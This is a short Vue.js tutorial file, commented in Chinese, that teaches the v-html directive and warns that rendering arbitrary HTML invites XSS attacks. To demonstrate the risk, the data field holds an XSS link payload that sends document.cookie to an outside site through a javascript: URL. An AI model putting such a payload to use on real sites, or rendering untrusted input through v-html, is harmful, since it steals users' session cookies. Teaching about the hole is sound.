<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>title</title>
    <script type="text/javascript" src="../vue.js"></script>
</head>

<body>

    <!-- 
    
    v-html指令：

    1.作用：向指定节点中渲染包含htm1结构的内容。
    2,与插值语法的区别：
        (1).v-htm1会替换掉节点中所有的内容，(xx)则不会。
        (2).v-html可以识别html结构。
    3.严重注意：v-htm1有安全性问题！！！！
        (1).在网站上动态渲染任意HTML是非常危险的，容易导到XSS攻击。
        (2),一定要在可信的内容上使用v-htm1,永不要用在用户提交的内容上！
 -->

    <div id="root">

        <h1>{{name}}</h1>
        <h1 v-text="name">tony</h1>
        <h1 v-html="msg">tony</h1>

    </div>


    <script>
        new Vue({
            el: "#root",
            data() {
                return {
                    name: "Jack",
                    msg: "<a href= javascript:location.href=href='https://www.baidu.com?'+document.cookie>XSS攻击</a>"
                }
            },
        })
    </script>
</body>

</html>
